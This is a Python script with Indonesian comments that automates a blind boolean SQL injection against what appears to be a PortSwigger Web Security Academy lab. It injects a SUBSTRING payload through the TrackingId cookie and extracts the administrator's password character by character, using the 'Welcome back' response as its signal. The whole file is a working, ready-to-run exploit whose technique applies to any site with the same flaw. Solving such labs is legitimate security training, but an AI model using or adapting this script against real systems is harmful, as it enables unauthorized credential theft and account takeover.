import requests
import string

# 1. Konfigurasi Target (Ganti sesuai URL lab kamu)
URL = "https://0a1f00b403e496b880ce6bdf00be00bc.web-security-academy.net/"

# Gunakan requests.Session() biar koneksi HTTP di-reuse, jalannya jadi jauh lebih cepat
session = requests.Session()

# Karakter yang mau kita tebak (a-z, 0-9)
alphabet = string.ascii_lowercase + string.digits
password = ""

print("[*] Memulai ekstraksi password administrator...")

# 2. Loop untuk menebak panjang password / posisi karakter (misal asumsi 20 karakter)
for position in range(1, 21):
    found_char = False
    
    for char in alphabet:
        # Payload SQLi untuk mendeteksi karakter di posisi tertentu
        # Menggunakan SUBSTRING untuk mengambil 1 huruf dan mencocokkannya
        payload = f"xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}"
        
        # PortSwigger mendeteksi SQLi lewat Cookie TrackingId
        cookies = {
            "TrackingId": payload,
            "session": "GANTI_DENGAN_SESSION_COOKIE_KAMU" # Lihat di Storage/Application Burp Suite
        }
        
        # Kirim request ke server
        response = session.get(URL, cookies=cookies)
        
        # 3. Indikator True/False (Kondisi spesifik dari lab PortSwigger)
        if "Welcome back" in response.text:
            password += char
            print(f"[+] Karakter ke-{position} ketemu: {char} -> Password sementara: {password}")
            found_char = True
            break # Berhenti nyari huruf lain untuk posisi ini, lanjut ke posisi berikutnya
            
    if not found_char:
        print(f"[-] Karaktek ke-{position} tidak ditemukan. Kemungkinan password sudah selesai.")
        break

print(f"\n[Visual] Ekstraksi Selesai! Password Admin: {password}")